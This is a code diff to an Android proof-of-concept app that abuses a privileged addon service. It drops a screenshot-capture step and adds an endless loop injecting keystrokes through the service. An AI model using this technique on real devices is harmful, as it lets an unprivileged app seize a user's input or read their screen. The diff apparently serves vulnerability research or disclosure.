@@ -25,7 +25,6 @@ public class MainActivity extends Activity implements ServiceConnection {
     private static final String TAG = "TWPOC";
 
     private IAddonService addOnService;
-    private ScreenshotData screenshotData;
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
@@ -59,17 +58,11 @@ public class MainActivity extends Activity implements ServiceConnection {
             Log.d(TAG, "ScreenShot info " + ssi.b);
             Log.d(TAG, "ScreenShot info " + ssi.c);
             Log.d(TAG, "ScreenShot info " + ssi.d);
+            while(true) {
+                addOnService.injectUnicode(0x41);
+            }
 
-            File f = getFilesDir().createTempFile("derp","img");
-            f.setWritable(true, false);
-            FileOutputStream s = new FileOutputStream(f);
-
-            screenshotData = new ScreenshotData(s.getFD());
-            addOnService.copyScreenshot(screenshotData, 0);
-
-            Log.d(TAG, "ScreenshotData: " + screenshotData);
-
-            Log.d(TAG, "We made it here without crashing.");
+            //Log.d(TAG, "We made it here without crashing.");
         } catch (Exception e) {
             e.printStackTrace();
         }
